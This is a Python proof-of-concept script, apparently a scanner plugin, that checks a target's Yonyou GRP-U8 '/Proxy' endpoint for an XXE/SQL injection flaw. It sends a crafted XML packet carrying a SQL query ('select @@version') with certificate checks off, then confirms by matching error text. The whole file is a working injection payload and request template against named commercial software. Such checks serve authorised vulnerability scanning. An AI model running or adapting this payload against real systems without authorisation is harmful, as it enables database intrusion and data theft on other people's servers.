import requests
import re, time
import urllib, random, string

def verify(url):
    result = {
        'name': '用友 GRP-U8 Proxy XXE-SQL注入漏洞',
        'vulnerable': False
    }
    sqli_payload = "select @@version"
    randstr = ''.join(random.sample(string.digits + string.ascii_letters, 6))
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, "/Proxy")
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">{0}</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data.format(sqli_payload), verify=False)
        if rep.status_code == 200 and re.search("Microsoft SQL Server", rep.text):
            rep2 = requests.post(vurl, headers=headers, timeout=timeout, data=data.format(randstr), verify=False)
            if re.search("错误代码", rep2.text) and re.search(randstr, rep2.text):
                result['vulnerable'] = True
        return result
    except:
        return result
